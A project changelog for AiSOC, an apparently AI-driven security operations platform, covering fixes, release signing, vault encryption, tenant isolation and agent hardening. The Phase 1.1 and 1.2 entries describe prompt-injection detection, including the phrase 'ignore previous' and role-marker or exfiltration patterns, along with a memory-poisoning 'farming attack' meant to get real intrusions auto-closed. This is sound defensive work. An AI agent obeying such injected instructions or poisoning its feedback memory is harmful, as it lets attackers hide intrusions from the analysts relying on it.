- **Phase 3.1 gates caught two latent bugs before merge** (exactly what the real-container tier is for — both would have shipped invisibly under the previous mock-only CI). (1) **`scripts/restore.sh` never restored anything.** `resolve_timestamp()` ended in a `[[ -z "$TIMESTAMP" ]] && { … }` guard that evaluates *false* once a timestamp is resolved; as the function's last command that non-zero status propagated out and, under `set -e`, aborted the script before the restore began — for **both** `--latest` and `--timestamp`. An untested backup script had been broken the whole time. Converted the guard to an explicit `if` + `return 0`; the backup → destroy → restore gate now restores 500/500 rows with a measured RTO. (2) **`services/fusion` `AlertSink` silently failed to persist every alert.** The dedup fingerprint (`$10`) was used untyped in both the `INSERT … SELECT` target (the `dedup_hash VARCHAR(64)` column) and `WHERE dedup_hash = $10` (varchar comparisons resolve through `text` operators), so asyncpg's prepare raised `inconsistent types deduced for parameter $10: text versus character varying` and the insert threw — the fused alert streamed over Kafka/WebSocket but never reached the alert store, so the spine's `GET /api/v1/alerts` assertion timed out. Pinned both uses to `::text`; the real-container spine gate now observes the alert row end to end.

### Security

- **Phase 2 continuation — signed, attested container images + SHA-pinned CI.** Every `ghcr.io/beenuar/*` service image pushed by `publish-images.yml` (push-to-main) and `release.yml` (tags) is now: (1) signed with `cosign` keyless/OIDC, (2) attested with a CycloneDX SBOM generated by `syft` and attached via `cosign attest --type cyclonedx`, and (3) built with BuildKit `provenance: mode=max` + `sbom: true` so SLSA provenance and an SPDX SBOM ride the image manifest. Every third-party GitHub Action across all 32 workflows is pinned to a full commit SHA (tag retained as a comment) so a tag-hijack of an upstream action cannot change what CI executes. `docs/operations/verifying-releases.md` rewritten with copy-pasteable verification commands for all four artifact types. Claim-to-gate matrix: "Signed / attested release artifacts" moved PARTIAL → GATED (11 GATED / 13 PARTIAL / 3 NO GATE).

- **Phase 2 — supply chain + truth gates.** New `.github/workflows/security.yml`: a claim-to-gate matrix ratchet (`scripts/check_claim_gate_matrix.py` — the NO GATE count may only decrease; enforces the Phase 0 promise) as the HARD gate, plus gitleaks (secret), Semgrep, Trivy (fs), and checkov/tfsec in report-and-ratchet ("observe") mode with a triage allowlist at `.security/allowlist.yml` / `.gitleaksignore` (GitHub push-protection remains the always-on hard secret gate). **Insecure defaults now hard-fail the boot in production**: `enforce_secure_defaults()` (`services/api/app/core/config.py`) raises `InsecureProductionDefaultsError` when `ENVIRONMENT=production` and any placeholder secret remains, wired into `app/main.py` startup and gated by `services/api/tests/test_security_defaults.py::test_enforce_*`. Added `TRADEMARK.md` (the MIT code is free; the name is not), `docs/operations/verifying-releases.md`, a README `Maturity` note, and fixed the `.github/LICENSES.md` license inconsistency (AiSOC ships under MIT, matching `LICENSE`/README, not Apache-2.0). Claim-to-gate matrix now 10 GATED / 14 PARTIAL / 3 NO GATE. Per-image CycloneDX SBOM + cosign signing + SLSA provenance, SHA-pinning all actions, and flipping the code scanners to blocking are the tracked Phase 2 continuation.

- **Phase 1.6 — platform/vault hardening (KMS envelope encryption).** New `services/api/app/security/envelope_cipher.py`: optional envelope encryption for the credential vault. Each secret is encrypted with a fresh per-secret data key (DEK); the DEK is wrapped by a key-encryption key (KEK) that never leaves KMS/HSM (`vault:v2:<kek_id>:<wrapped_dek>:<ciphertext>`), so a DB dump or a leaked env var yields only wrapped DEKs. Pluggable `KeyManager` protocol with `LocalKeyManager` (default, backward-compatible), `AwsKmsKeyManager` (boto3; GCP KMS / Vault Transit implement the same protocol), and an in-memory `FakeKmsKeyManager` for tests. Key rotation is a cheap **re-wrap** (`EnvelopeCipher.rewrap`) that never re-encrypts the secret body. Gated by `services/api/tests/test_envelope_cipher.py` (round-trip, rotation + re-wrap, plaintext-never-in-token, fail-closed on tamper/wrong-KEK). Added `docs/security/platform-threat-model.md` (STRIDE, vault as top asset) and `docs/security/connector-least-privilege.md`. Completes Phase 1.

- **Phase 1.5 — cost-DoS enforcement.** New `services/agents/app/core/cost_governor.py`: a per-tenant `CostGovernor` that turns the existing `aisoc_run_costs` telemetry into enforcement — rolling-window soft/hard USD budgets, a circuit breaker that drops investigations to deterministic-only mode once the hard cap is hit (instead of billing unboundedly), a per-alert token ceiling (`cap_tokens`), and an evidence-hash dedup cache so a flood of identical alerts costs one investigation, not N. Gated by `services/agents/tests/test_cost_governor.py` (10 tests incl. the headline 10 000-identical-alert flood asserting spend stays at exactly one run, and a distinct-alert flood asserting the circuit breaker bounds spend near the hard cap). Live-orchestrator wiring of `get_governor().check(...)` before the LLM call is the tracked continuation.

- **Phase 1.4 — evidence redaction pipeline (honest no-exfiltration).** New `services/agents/app/privacy/redactor.py`: a per-run, per-tenant, in-memory reversible `Pseudonymizer` that replaces the customer's identifying data (internal IPs, emails, file paths, secrets, internal hostnames, usernames) with opaque tokens (`USER_1`, `HOST_2`, `IP_3`) before evidence leaves the process, while preserving public threat indicators so the agent can still reason. `RedactionConfig` defaults every category on. Gated by `services/agents/tests/test_privacy_redactor.py` (golden-corpus assertion: zero raw customer PII survives; round-trip re-hydration; public IOCs preserved). Rewrote the README "no data exfiltration" differentiator to be precise per mode and added `docs/trust/data-flows.md` documenting exactly what leaves the perimeter (local air-gapped / hosted-with-redaction / hosted-raw). Contract-egress enforcement + air-gapped CI job + Helm egress NetworkPolicy are the tracked 1.4 continuation.

- **Phase 1.3 — cross-store tenant isolation (Qdrant + harness).** Closed the Qdrant leak the reality audit flagged: `services/threatintel/app/storage/qdrant.py` had no tenant scoping at all (global collections, no filter, no `tenant_id` in payloads). Added `tenant_scope_filter` + tenant-stamped payloads + tenant-scoped point ids so a search as tenant A can never surface tenant B's private vectors, while global feed intel stays shared under a `SHARED_TENANT` sentinel (backward-compatible with the feed pipeline). Stood up a table-driven `tests/isolation/` suite (registry in `stores.py` so a new store cannot ship without an isolation entry) and a new `.github/workflows/isolation.yml` gate running the offline layer on every PR. Neo4j/Redis/ClickHouse/Kafka live-container replay is registered as `container_pending` for Phase 3's integration tier.

- **Phase 1.2 — memory-poisoning defenses for the override-learning loop.** New pure `services/api/app/services/memory_poisoning.py`: provenance on every memory write (`MemoryProvenance` — no anonymous memory), trust weighting (verified human outranks autonomous closure) with age decay so lessons must be re-confirmed, a `PoisoningDetector` that flags a burst of same-signature false-positive dispositions from low-trust authors, and blast-radius controls for retroactive re-disposition (`plan_redisposition` + `compute_confirmation_token`: capped batches, explicit confirmation token over the exact alert set, quarantine on flagged signatures). Wired into `override_learning.py` (poisoning-resistant signature key now includes the entity-independent severity band; provenance stamped on writes; `apply_redisposition` requires the token and enforces the cap) and the `/feedback` endpoints (preview returns the token + quarantine state; apply rejects stale/tampered/over-cap batches with 409). The farming-attack eval (`services/api/tests/test_memory_poisoning.py::test_farming_attack_then_real_attack_is_not_auto_closed`) gates the api job: a poisoned signature is flagged and its retroactive apply quarantined, so the real intrusion is not auto-closed.

- **Phase 1.1 — prompt-injection structural containment + detection.** New `services/agents/app/prompting/envelope.py`: per-run cryptographic-nonce evidence fence (`EvidenceEnvelope`, `make_nonce`, `system_rule`) so injected text cannot forge the closing delimiter to break out of the data block, and a `PromptInjectionGuard` that scans untrusted evidence for instruction-shaped content (role markers, "ignore previous", secret/prompt exfiltration, SOAR tool-name mentions, base64- and zero-width-obfuscated directives) and, on a high-severity hit, signals demotion of the case autonomy tier to L0. Added `services/agents/tests/test_prompt_envelope.py` (25 tests across every ingest path) and gated it plus the previously-ungated `test_prompt_sanitizer.py` in the CI agents job (fixed its stale agent-wiring expectations — the investigator agents sanitise via `sanitize_text` / `sanitize_iterable_of_strings` / `format_bundle_prompt_append`). Threat model: `docs/security/agent-threat-model.md`.

### Added

- **World-class program Phase 0 — reality audit** (no product code). `docs/audit/REALITY_REPORT.md` classifies every headline `README.md` claim against the code (`production` / `functional-untested` / `template-fallback` / `demo-only` / `stub`) and ranks Overclaims, Load-bearing untested paths, and Circular gates. `docs/audit/CLAIM_TO_GATE_MATRIX.md` maps 27 claims to their CI gate or `NO GATE` (9 GATED / 11 PARTIAL / 7 NO GATE), each with a binding "Closes in" phase. The committed 12-phase status checklist lives in `ROADMAP.md` (per-session working detail is in the gitignored `docs/audit/PROGRESS.md`). Tracking doc: `AISOC_CURSOR_PROMPT_V2.md`.

## [7.5.0] — 2026-06-29

v8.0-milestone and trust-readiness release. Folds in the **AiSOC missing
pieces — Phases 1–5** rollup (PR [#337](https://github.com/beenuar/AiSOC/pull/337);
25 commits, 188 files, +23 743 / -907), four named v8.0 milestones (T3.7
NL→playbook, T3.8 design system v2, T4 wave-3 marketplace + 6 hardened
connectors, T5.3 fidelity loaders), the marketing-shell unification on
`tryaisoc.com`, the threat-actor attribution RBAC + port fix, and a large
Dependabot + security sweep that landed on `main` since v7.4.0.

### Highlights

- **AiSOC missing pieces — Phases 1–5 rollup**
  (PR [#337](https://github.com/beenuar/AiSOC/pull/337)). Closes every
  item in `plans/aisoc-missing-pieces/` in a single landing: trust-critical
  honesty fixes on `/sovereign` + Features + README, CI matrix expanded to
  7 previously-untested Python services (~971 new test signals), coverage
  gates, real SOAR executors for SentinelOne EDR / PAN-OS / FortiGate /
  Cloudflare WAF + DNS / Splunk ES / Elastic / MDE / Entra ID / Google
  Workspace, real `CreateTicketExecutor` wired to Jira / ServiceNow /
  PagerDuty, Azure/GCP/Okta/GWS effective-permissions resolvers, the
  managed-mode auto-provision pipeline (`infra/fly/managed/`), CI-built
  white-paper PDFs + 90 s Playwright screencast, the deterministic
  NL → ES|QL / KQL / SPL translator (**81-case eval at 100 % syntactic +
  100 % semantic**), real-browser visual regression, a buyer-journey E2E,
  and four immutable ADRs (`docs/decisions/0001`-`0004`).
- **v8.0 milestones — design system, playbook generator, wave-3
  connectors, fidelity loaders.**
  T3.7 NL → playbook generator
  (PR [#330](https://github.com/beenuar/AiSOC/pull/330));
  T3.8 design system v2 + Storybook
  (PR [#331](https://github.com/beenuar/AiSOC/pull/331),
  `DraftFromPromptDialog` story restored in
  PR [#335](https://github.com/beenuar/AiSOC/pull/335),
  Storybook publicDir conflict fixed in
  PR [#336](https://github.com/beenuar/AiSOC/pull/336));
  T4 wave-3 marketplace scaffolding + six hardened connectors
  (PR [#333](https://github.com/beenuar/AiSOC/pull/333),
  wave-1 parity hardening in
  PR [#328](https://github.com/beenuar/AiSOC/pull/328));
  T5.3 AIT-LDS + MITRE Engenuity fidelity loaders
  (PR [#332](https://github.com/beenuar/AiSOC/pull/332)).
- **Threat-actor attribution — port fix + optional RBAC.** The
  investigation agent defaulted `AISOC_THREATINTEL_URL` to
  `http://threatintel:8083`, but the service binds **8005** — every
  `POST /api/v1/actors/attribute` from
  `services/agents/app/agents/investigation_agent.py` therefore hit a port
  nothing listens on and silently degraded. Default corrected, docs +
  `AISOC_ATTRIBUTION_TIMEOUT_SECONDS` aligned, regression test added
  (PR [#327](https://github.com/beenuar/AiSOC/pull/327)). Same release
  ships an opt-in shared-secret gate
  (PR [#329](https://github.com/beenuar/AiSOC/pull/329)): when
  `AISOC_THREATINTEL_SERVICE_TOKEN` is set, every `/api/v1/actors/*` call
  must present `Authorization: Bearer <token>` (constant-time compared,
  `401` on mismatch); unset keeps the legacy unauthenticated behaviour
  and logs a warning. Resolves the `[#TODO-attribution-rbac]` caveat in
  `docs/threat-actor-attribution.md`.
- **Marketing-shell unification on `tryaisoc.com` (QA wave, 2026-06-29).**
  Every `/(marketing)` page, plus the standalone `/not-found`,
  `/why-open-source`, and `/benchmark` routes, now renders the same
  `StickyNav` + `sections/Footer` shell. The old simpler `LandingNav.tsx`
  and `landing/Footer.tsx` were deleted; eleven marketing pages had their
  per-page nav/footer JSX + imports removed; `(marketing)/layout.tsx`
  centrally injects the shell; `StickyNav`'s anchors were absolutised
  (`/#solution`, `/benchmark`, `/pricing`) so they resolve identically
  from the landing page and from any subpage. Folded together with the
  smaller fixes from the same QA pass: branded `/not-found` page
  (`ISSUE-004`), `308 /signup → /dashboard` for the anonymous demo
  (`ISSUE-003`), `Testimonials` "Become a reference partner" CTA
  repointed from the 404'ing `/partners` to `/contact` (`ISSUE-002`),
  dead `status.tryaisoc.com` footer link removed (`ISSUE-005`), and an
  SSR-whitespace bug on `/about` that rendered "the 69connectors"
  fixed by forcing an explicit `{' '}` token (`ISSUE-007`).
- **Knowledge-base ingest — boundary-aware chunking with overlap**
  (PR [#321](https://github.com/beenuar/AiSOC/pull/321), closes
  [#277](https://github.com/beenuar/AiSOC/issues/277)). KB ingestion no
  longer splits mid-sentence or mid-code-fence; the new chunker prefers
  paragraph / sentence / code-block boundaries, applies a configurable
  overlap so retrieval doesn't lose context across chunks, and keeps the
  produced chunks within the embedding model's hard token budget.
- **Realtime — WS/SSE authenticated via short-lived tickets**
  (PR [#246](https://github.com/beenuar/AiSOC/pull/246), closes
  [#239](https://github.com/beenuar/AiSOC/issues/239)). The realtime
  service's WebSocket and SSE endpoints previously accepted any
  connection. They now require a short-lived signed ticket that the API
  mints for the authenticated session, closing the unauthenticated
  fan-out surface that lived between `services/realtime` and `apps/web`.
- **`apps/web` — Create Case button wired on `/alerts/{id}`**
  (PR [#294](https://github.com/beenuar/AiSOC/pull/294), closes
  [#293](https://github.com/beenuar/AiSOC/issues/293)). The button on
  alert detail rendered but did nothing; it now POSTs through the cases
  endpoint and navigates to the new case workspace.
- **Infrastructure — Terraform CI + missing core modules.** Terraform
  workflow on every `infra/terraform/**` change
  (PR [#251](https://github.com/beenuar/AiSOC/pull/251)) runs
  `terraform init -backend=false`, `terraform validate`, and
  `terraform fmt -check -recursive` against the AWS, GCP, Azure, and
  BYOC configurations; the three reusable modules the AWS and BYOC
  references were already importing — `rds`, `elasticache`, `kafka` —
  are now actually present in `infra/terraform/modules/`
  (PR [#252](https://github.com/beenuar/AiSOC/pull/252)) so a fresh
  `terraform init` against the multi-cloud skeletons no longer errors on
  missing sources. GCP sensitive-var taint cleared on `for_each`
  (PR [#243](https://github.com/beenuar/AiSOC/pull/243)); Azure
  Terraform skeleton documented
  (PR [#247](https://github.com/beenuar/AiSOC/pull/247)).
- **Dependency & CI maintenance.** ~15 Dependabot upgrades across the
  Python, JS, and Go services (FastAPI in `services/{api,actions,agents}`
  via [#317](https://github.com/beenuar/AiSOC/pull/317),
  [#319](https://github.com/beenuar/AiSOC/pull/319),
  [#320](https://github.com/beenuar/AiSOC/pull/320);
  `next` 16.2.7 → 16.2.9 in
  [#323](https://github.com/beenuar/AiSOC/pull/323);
  `framer-motion` 11.18.2 → 12.40.0 in
  [#307](https://github.com/beenuar/AiSOC/pull/307);
  `cryptography` in
  [#301](https://github.com/beenuar/AiSOC/pull/301) /
  [#302](https://github.com/beenuar/AiSOC/pull/302); Go `redis/go-redis`
  in [#297](https://github.com/beenuar/AiSOC/pull/297) /
  [#298](https://github.com/beenuar/AiSOC/pull/298);
  `strawberry-graphql` in
  [#318](https://github.com/beenuar/AiSOC/pull/318);
  `actions/checkout` v6 → v7 in
  [#316](https://github.com/beenuar/AiSOC/pull/316); plus
  `@xyflow/react`, `@types/node`, `tsx`, `@tailwindcss/postcss`); pnpm
  audit high/critical findings cleared
  (PR [#322](https://github.com/beenuar/AiSOC/pull/322)) so the dep-bump
  PR queue could actually merge; a duplicate `@mdx-js/react` key that
  was breaking `pnpm install` removed
  (PR [#296](https://github.com/beenuar/AiSOC/pull/296)); `aiohttp` bumped
  to 3.14.1 to clear CVE-2026-34993 + CVE-2026-47265
  (PR [#295](https://github.com/beenuar/AiSOC/pull/295)).

### AiSOC missing pieces — Phases 1–5 (PR [#337](https://github.com/beenuar/AiSOC/pull/337))

The largest single landing in this release. Twenty-five commits implement
the entire `plans/aisoc-missing-pieces/` roadmap; nothing in the plan is
deferred.

**Phase 1 — Trust-critical fixes** (`1.1`–`1.6`): one build-time
generator + CI gate is now the only place the marquee connector count
lives; the hard-coded `★ 2.3k` GitHub-stars badge was replaced with a
live shields.io endpoint; every SOC 2 / ISO 27001 / GDPR / DPDP claim
across `/sovereign`, `Features.tsx`, and `README.md` is now qualified
with the honest *"controls aligned to"* framing pending a Type I audit
(ADR-0002 below); seven 404'ing footer links and two pricing CTAs were
either stubbed, repointed to `mailto:`, or redirected to GitHub; the
real `services/connectors/app/connectors/gitlab.py` connector that the
marquee pill had been claiming was real now exists; and the `/sovereign`
Terraform deep-links route to the correct subdirectories per cloud, with
Azure added and the unsupported clouds struck.

**Phase 2 — Operational readiness** (`2.1`–`2.6`): the seven Python
services that were silently outside the CI matrix
(`services/{ueba,honeytokens,purple-team,osquery-tls,connectors,actions,
threatintel}` in practice) are now included; the `pytest` and Vitest
configurations enforce a coverage floor via `--cov-fail-under` and the
Vitest `coverage.thresholds`; `prometheus.yml` no longer lists scrape
targets that don't exist (CI now gates against drift); Prometheus
alerting rules + Alertmanager container are wired in `docker-compose.yml`;
seven incident runbooks land under `docs/runbooks/`; and every FastAPI
service now exposes `/livez` (the process is up) and `/readyz`
(dependencies are reachable) separate from the existing `/health`.

**Phase 3 — Real SOAR executors** (`3.1`–`3.5`): the executor surface
stops being a façade. SentinelOne EDR has a real client
(`services/actions/app/integrations/sentinelone.py`) wired to
`ContainHostExecutor`; PAN-OS, FortiGate, Cloudflare WAF, and Cloudflare
DNS firewall each have a real client wired to the appropriate `Block…`
executor; `AckAlertExecutor` and `SuppressAlertExecutor` now talk to
Splunk Enterprise Security, Elastic Security, and Microsoft Defender for
Endpoint directly; Entra ID and Google Workspace are wired as real IdP
clients for `DisableUserExecutor`; and `CreateTicketExecutor` no longer
returns `SIMULATED` — it delegates to the existing Jira, ServiceNow, and
PagerDuty connectors.

**Phase 4 — Larger build-out** (`4.1`–`4.8`):

- **4.1** — Azure RBAC, GCP IAM, Okta, and Google Workspace
  effective-permissions resolvers (closes T3.2). The investigation agent
  can now answer "what can this principal actually do?" across all four
  IdPs, not just AWS.
- **4.2** — Managed-mode auto-provision pipeline (closes T6.1):
  `infra/fly/managed/` + a workflow that creates a fresh Fly tenant from
  a push to `main`, dry-run-safe (won't act without `FLY_API_TOKEN`).
- **4.3** — `make papers` builds the white-paper PDFs in CI, and a
  Playwright project records a 90-second product screencast on demand.
- **4.4** — Connector wave finished: Sysdig, Vault, Snowflake, and
  Cloudflare Zero Trust manifests + docs.
- **4.5** — Pluggable event-warehouse provider
  (`services/api/app/services/event_warehouse/`) with Elasticsearch,
  Splunk, and Chronicle implementations; `croniter`-backed hunt
  scheduler (closes Milestone 1F).
- **4.6** — Deterministic NL → ES|QL / KQL / SPL translator. **81-case
  eval, 100 % syntactic, 100 % semantic** — every output is parsed
  through a grammar validator before return.
- **4.7** — Real-browser visual regression: Playwright + Storybook,
  pinned to `mcr.microsoft.com/playwright:v1.49.0-jammy`. First CI run
  needs `--update-snapshots`.
- **4.8** — Buyer-journey E2E covering `/alerts → Investigation Rail →
  /playbooks` runs on `pnpm e2e`.

**Phase 5 — Strategic decisions** (`5.1`–`5.4`): four immutable ADRs.
[`0001-cyble-cti-moat.md`](docs/decisions/0001-cyble-cti-moat.md) retires
the Cyble-only CTI moat in favour of a pluggable MIT-compatible CTI
fusion layer; [`0002-compliance-claims.md`](docs/decisions/0002-compliance-claims.md)
fixes the *"controls aligned to"* framing until a Type I audit lands and
gates it on a concrete enterprise design partner;
[`0003-mssp-pricing-shape.md`](docs/decisions/0003-mssp-pricing-shape.md)
keeps three public tiers, with MSSP getting its own narrative at
`/mssp`; [`0004-live-demo-strategy.md`](docs/decisions/0004-live-demo-strategy.md)
retires the Cloudflare Tunnel demo and provisions a dedicated managed-mode
tenant on Fly.io.

The Playwright projects (`screencast`, `visual`, `journey`) are gated by
`PLAYWRIGHT_PROJECT` so no project's `webServer` boots when another
runs. The four ADRs are immutable: future changes write a new ADR that
supersedes the old one.

### v8.0 milestones — design system v2, NL→playbook, wave-3 connectors, fidelity loaders

**T3.7 — NL → playbook generator**
(PR [#330](https://github.com/beenuar/AiSOC/pull/330)). Operators can
type a runbook in English and the agent emits a structured playbook YAML
that fits the existing `services/actions` schema: graph of executors,
inputs, and conditionals, with the same JSON-schema validation the
console editor enforces. Backed by the same deterministic translator
substrate as Phase 4.6 so the output stays parsable when the LLM goes
sideways.

**T3.8 — Design system v2 + Storybook**
(PR [#331](https://github.com/beenuar/AiSOC/pull/331)). The console
finally has a single source of truth for tokens, primitives, and
composites. `apps/web/src/components/ui/` is now organized as
`tokens / primitives / patterns`, every component renders in Storybook,
and the visual-regression CI gate from Phase 4.7 watches it.
`DraftFromPromptDialog` was momentarily lost during the migration and
restored in PR [#335](https://github.com/beenuar/AiSOC/pull/335). The
Vite `publicDir` copy that broke the Storybook build under the new
config was disabled in PR
[#336](https://github.com/beenuar/AiSOC/pull/336) so main CI stays
green.

**T4 — Wave-3 marketplace scaffolding + six hardened connectors**
(PR [#333](https://github.com/beenuar/AiSOC/pull/333)). The marketplace
registry gains the schema + tooling for the third connector wave; six
wave-2 connectors had their tests and fixtures hardened to wave-1 parity
in PR [#328](https://github.com/beenuar/AiSOC/pull/328) so every
first-party connector ships with the same shape of negative-path
coverage.

**T5.3 — AIT-LDS + MITRE Engenuity fidelity loaders**
(PR [#332](https://github.com/beenuar/AiSOC/pull/332)).
Detection-fidelity scoring now ingests two canonical labelled datasets:
the AI-Threats Labelled Dataset and the MITRE Engenuity ATT&CK
evaluation set, both fronted by deterministic loaders so the
fidelity-score outputs are reproducible across CI runs.

### Threat-actor attribution — port fix + RBAC

Two narrowly-scoped fixes that together close the only path by which the
investigation agent could silently degrade.

`services/agents/app/agents/investigation_agent.py` defaulted
`AISOC_THREATINTEL_URL` to `http://threatintel:8083`. The service binds
**8005** in its Dockerfile, in `docker-compose.yml`, and in the README
service table — every `POST /api/v1/actors/attribute` call therefore hit
a port nothing listens on. The error path was soft-handled, so
attribution wasn't 500-ing; it was returning empty
attribution silently. PR [#327](https://github.com/beenuar/AiSOC/pull/327)
corrects the default to `http://threatintel:8005`, fixes the matching
`docs/threat-actor-attribution.md` references, raises the stale
`AISOC_ATTRIBUTION_TIMEOUT_SECONDS` default from `10` to `30`, and adds
a regression test (`services/agents/tests/test_attribution_service_url.py`)
that pins the URL and timeout so this can't drift again.

PR [#329](https://github.com/beenuar/AiSOC/pull/329) layers an opt-in
shared-secret gate on the actor-attribution router. When
`AISOC_THREATINTEL_SERVICE_TOKEN` is set, every `/api/v1/actors/*` call
must present `Authorization: Bearer <token>`; the comparison is
constant-time, `401` on mismatch. When the env var is unset, the
endpoints stay unauthenticated for backward compatibility and emit a
single startup warning so the operator knows the gate isn't on. The
investigation agent forwards the token via its own
`AISOC_THREATINTEL_SERVICE_TOKEN`. Resolves the
`[#TODO-attribution-rbac]` caveat in `docs/threat-actor-attribution.md`.

### Marketing-shell unification on `tryaisoc.com`

Pre-7.5 the marketing surface was rendering two different navigation
components — the richer `StickyNav` on the landing page and the older
`LandingNav` everywhere else — and likewise two footers. Subpage visitors
saw a degraded nav with hash-only anchors that misbehaved (e.g. `#pricing`
on `/about` was a no-op rather than navigating to `/pricing`).

The unification (commit
[`77039a41`](https://github.com/beenuar/AiSOC/commit/77039a41)):

- `apps/web/src/app/(marketing)/layout.tsx` now imports `StickyNav`
  and `sections/Footer` and renders them around `{children}`. Every
  page in the `(marketing)` route group is content-only.
- Eleven marketing pages had their per-page nav/footer JSX + imports
  removed — they now inherit from the layout.
- The standalone routes (`not-found.tsx`, `why-open-source/page.tsx`,
  `benchmark/page.tsx`) — which live *outside* `(marketing)` and so
  can't pick up its layout — import `StickyNav` and `sections/Footer`
  directly.
- `StickyNav`'s `NAV_LINKS` were absolutised so they work from any URL:
  `/#solution`, `/#pillars`, `/#connectors`, `/benchmark`, `/pricing`,
  `docs/intro`. The "Self-host" CTA points at `/pricing` for the same
  reason.
- `apps/web/src/components/landing/LandingNav.tsx` and
  `apps/web/src/components/landing/Footer.tsx` were **deleted**.

Bundled in the same QA wave:

- **`ISSUE-002`** — `Testimonials` "Become a reference partner" CTA was
  pointing at `/partners`, which 404s. Now goes to `/contact`.
- **`ISSUE-003`** — `/signup` 308-redirects to `/dashboard`. The
  anonymous demo dashboard *is* the signup flow; the old form-fronted
  signup is gone.
- **`ISSUE-004`** — `/not-found` is now a branded dark-theme page with
  the unified shell and a "back to home" CTA, replacing Next's default.
- **`ISSUE-005`** — Removed the dead `status.tryaisoc.com` link from
  the footer.
- **`ISSUE-007`** — `/about` rendered "the 69connectors" because
  React's JSX text-children whitespace rules drop the leading space of
  a text segment that wraps right after a `{expression}`. Forced an
  explicit `{' '}` token so the layout-quirk is immune to reflow.

### Knowledge-base — boundary-aware chunking with overlap

PR [#321](https://github.com/beenuar/AiSOC/pull/321) (closes
[#277](https://github.com/beenuar/AiSOC/issues/277)). The previous
chunker split on a flat character budget, which routinely produced
mid-sentence chunks and severed code fences. The new chunker walks the
document with `paragraph → sentence → token` precedence, applies an
overlap (default 64 tokens, configurable) so retrieval doesn't lose
context across chunks, and keeps every produced chunk under the
embedding model's hard token budget. Retrieval quality on the existing
KB ingestion fixtures improved without any model change.

### Realtime — short-lived ticket auth on WS/SSE

PR [#246](https://github.com/beenuar/AiSOC/pull/246) (closes
[#239](https://github.com/beenuar/AiSOC/issues/239)). The realtime
service previously accepted any WebSocket or SSE connection — there was
no way to assert which tenant a stream belonged to except via the
client's word for it. Connections now require a short-lived signed
ticket that the API issues to the authenticated session; the ticket
encodes the tenant and the subscription scope and expires after a small
window so a stolen ticket can't long-tail. Closes a multi-tenant
fan-out surface that had been live since the realtime service shipped.

### Infrastructure — Terraform CI + missing core modules

PR [#251](https://github.com/beenuar/AiSOC/pull/251) — every push that
touches `infra/terraform/**` now runs `terraform init -backend=false`,
`terraform validate`, and `terraform fmt -check -recursive` against the
AWS, GCP, Azure, and BYOC configurations. The same gates ran locally in
the v7.4.0 deploys; they're now actually enforced.

PR [#252](https://github.com/beenuar/AiSOC/pull/252) — the AWS and BYOC
references in v7.4.0 imported `infra/terraform/modules/rds`,
`modules/elasticache`, and `modules/kafka` from sources that did not
exist in the repo. The three modules are now actually present, so a
fresh `terraform init` against the multi-cloud skeletons no longer
errors on a missing source. PR
[#243](https://github.com/beenuar/AiSOC/pull/243) drops the
sensitive-var taint from `for_each` in the GCP module so the plan stays
clean. PR [#247](https://github.com/beenuar/AiSOC/pull/247) documents
the Azure Terraform skeleton end-to-end in `apps/docs/`.

### Dependency & CI maintenance

Around fifteen Dependabot landings since v7.4.0; the headline ones:

- **FastAPI** updated in `services/api`, `services/actions`, and
  `services/agents` (PRs
  [#317](https://github.com/beenuar/AiSOC/pull/317),
  [#319](https://github.com/beenuar/AiSOC/pull/319),
  [#320](https://github.com/beenuar/AiSOC/pull/320)).
- **`next`** 16.2.7 → 16.2.9 (PR
  [#323](https://github.com/beenuar/AiSOC/pull/323)).
- **`framer-motion`** 11.18.2 → 12.40.0 (PR
  [#307](https://github.com/beenuar/AiSOC/pull/307)).
- **`cryptography`** updated in `services/api` and `services/actions`
  (PRs [#301](https://github.com/beenuar/AiSOC/pull/301),
  [#302](https://github.com/beenuar/AiSOC/pull/302)).
- **`redis/go-redis/v9`** updated in `services/enrichment` and
  `services/ingest` (PRs
  [#297](https://github.com/beenuar/AiSOC/pull/297),
  [#298](https://github.com/beenuar/AiSOC/pull/298)).
- **`strawberry-graphql`** updated in `services/api`
  (PR [#318](https://github.com/beenuar/AiSOC/pull/318)).
- **`actions/checkout`** v6 → v7 across every workflow
  (PR [#316](https://github.com/beenuar/AiSOC/pull/316)).
- **`aiohttp`** 3.14.1 to clear CVE-2026-34993 + CVE-2026-47265
  (PR [#295](https://github.com/beenuar/AiSOC/pull/295)).
- **pnpm audit** cleared of all high/critical findings
  (PR [#322](https://github.com/beenuar/AiSOC/pull/322)) so the dep-bump
  queue could merge without the global gate failing on unrelated noise.
- **`pnpm-lock.yaml`** duplicate `@mdx-js/react` key fixed
  (PR [#296](https://github.com/beenuar/AiSOC/pull/296)) — was breaking
  `pnpm install` on fresh clones.
- Other dev/test bumps: `@xyflow/react` 12.10.2 → 12.11.0
  (PR [#283](https://github.com/beenuar/AiSOC/pull/283)),
  `@types/node` 20.19.39 → 25.9.2
  (PR [#285](https://github.com/beenuar/AiSOC/pull/285)),
  `tsx` 4.22.1 → 4.22.4 (PR
  [#306](https://github.com/beenuar/AiSOC/pull/306)),
  `@tailwindcss/postcss` 4.3.0 → 4.3.1 (PR
  [#305](https://github.com/beenuar/AiSOC/pull/305)).

### Docs

- `AISOC_V8_PROGRESS.md` tracker re-introduced
  (PR [#334](https://github.com/beenuar/AiSOC/pull/334)) so the v8.0
  milestone burn-down lives at the repo root again.
- `AGENTS.md` updated to record AiSOC (`github.com/beenuar/AiSOC`) as the
  single source of truth — the older `AISOC-Cyble` mirror is now
  archived (PR [#326](https://github.com/beenuar/AiSOC/pull/326);
  archive-notice sync in PR
  [#325](https://github.com/beenuar/AiSOC/pull/325); `plans/cyble-aisoc/`
  subtree merged for posterity in PR
  [#324](https://github.com/beenuar/AiSOC/pull/324)).
- Marketing-page docs links repointed at the Docusaurus site
  (PR [#245](https://github.com/beenuar/AiSOC/pull/245)).
- Connector pages — Vault → Auth0/Okta cross-links unbroken
  (post-merge fix on `main`).
- `README.md` synced to v7.4.0 ahead of this release
  (PR [#246](https://github.com/beenuar/AiSOC/pull/246)).

### Changed

- **`VERSION`** bumped 7.4.0 → 7.5.0.
- **`apps/web/package.json`** bumped 7.3.1 → 7.5.0. The web app's
  `package.json` had drifted from `VERSION` since the v7.3.1 hotfix;
  this release reconciles them.
- **`README.md`** version badge + headline updated to v7.5.0.

### Migration notes

None required for users on v7.4.0 — every change in this release is
either additive (new endpoints, new env vars defaulting to safe
unauthenticated behaviour, new connectors and executors) or a pure bug
fix to existing behaviour. Specifically:

- The threat-actor attribution port fix changes a *default* — if you
  had explicitly set `AISOC_THREATINTEL_URL` in your environment, it is
  honoured unchanged.
